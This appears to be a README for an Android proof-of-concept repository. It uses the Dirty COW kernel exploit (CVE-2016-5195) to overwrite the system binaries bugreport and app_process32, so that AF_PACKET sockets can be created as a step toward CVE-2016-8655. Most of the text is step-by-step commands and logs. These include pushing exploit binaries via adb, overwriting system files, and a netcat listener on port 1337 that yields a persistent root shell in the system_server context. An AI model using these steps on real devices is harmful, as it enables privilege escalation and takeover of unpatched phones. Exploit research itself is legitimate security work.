# Creating a AF_PACKET on Android using CVE-2016-5195
Apparently (CVE-2016-8655 may be possible on Android):
"On Android, processes with gid=3004/AID_NET_RAW are able to create AF_PACKET sockets (mediaserver) and can trigger the bug." (http://seclists.org/oss-sec/2016/q4/607, Philip Pettersson)

This repo proves it is possible for an unpriveledged user to create an AF_PACKET socket on Android by using the dirty COW exploit (CVE-2016-5195).

TODO actually code the rest of the expoit (haven't even read how it works yet :) )

This may help other people getting started though.

PoC only.

# Device Specifics
Using a MOTO G4 Play (32 bit Android Security Patch Middle 2016)
Device SE Linux specifics:
I couldn't create an AF_Packet socket with my GID as 3004 and ID as ROOT. (context as shell)
My device SE Linux allows "net_raw" on the system_server.te

Device specifics assumed files:
/system/bin/app_process32
/system/bin/bugreport
Make sure size(bugreport) < size(checksocket) and size(app_process32) < size(appspawn)


# How To
```
$ echo setup your own Android.mk
$ echo I just use a Makefile that has my NDK toolchain path in it.
$ make appspawn checksock
$ make dirtycow
$ adp() { for i in "$@"; do adb push $i /data/local/tmp; done; }
$ adp dirtycow checksock appspawn
$ adb shell
$ cp /system/bin/bugreport /data/local/tmp/bugreportold
$ cp /system/bin/app_process32 /data/local/tmp/app_process32old
$ /data/local/tmp/dirtycow /system/bin/bugreport /data/local/tmp/checksocket
$
$ open a new window (Window 2) (monitor checksocket to see if you can create the socket):
$ adb shell
$ logcat tcix:* *:S
$
$ open a new window (Window 3) (checksocket will also create a basic shell on 1337 once it starts, might be useful for the future):
$ adb shell
$ /data/local/tmp/nc -l 0.0.0.0 1337
$ 
$ on the original window (if your phone screen is off, wake it up to cause a new app_process32 to spawn.):
$ adb shell 
$ /data/local/tmp/dirtycow /system/bin/app_process32 /data/local/tmp/appspawn
$ 
```
Watch Window 2, if check_sock is forked it will output to this log.
You should see similar to the text below. It should be printed over and over until you reset app_process32 (reboot or see below).
If you see in the log *Created a AF_PACKET socket*. It is possible to create an AF_PACKET on your device 
```
12-17 13:38:00.572 17885 17885 I tcshell : free of app_process32
12-17 13:38:00.572 17885 17885 I tcshell : opening sock
12-17 13:38:00.572 17885 17885 I tcshell : Created a socket
*12-17 13:38:00.572 17885 17885 I tcshell : Created a AF_PACKET socket*
12-17 13:38:00.612 17885 17885 I tcshell : setting up socket...
12-17 13:38:00.612 17885 17885 I tcshell : was able to create socket??
12-17 13:38:00.612 17885 17885 I tcshell : Starting LSHirtycow /system/bin/app_process32 /data/local/tmp/app_process32old
```
On Window 3 you should get a persistent shell in the system_server context
```
shell@harpia:/data/local/tmp $ ./nc -l 0.0.0.0 1337                  
> id
uid=0(root) gid=0(root) groups=0(root) context=u:r:system_server:s0
>
```
App_process will keep spawning more checksockets. Reset app_process32 and bugreport:
```
$ adb shell
$ /data/local/tmp/dirtycow /system/bin/app_process32 /data/local/tmp/app_process32old
$ /data/local/tmp/dirtycow /system/bin/bugreport /data/local/tmp/bugreport
```


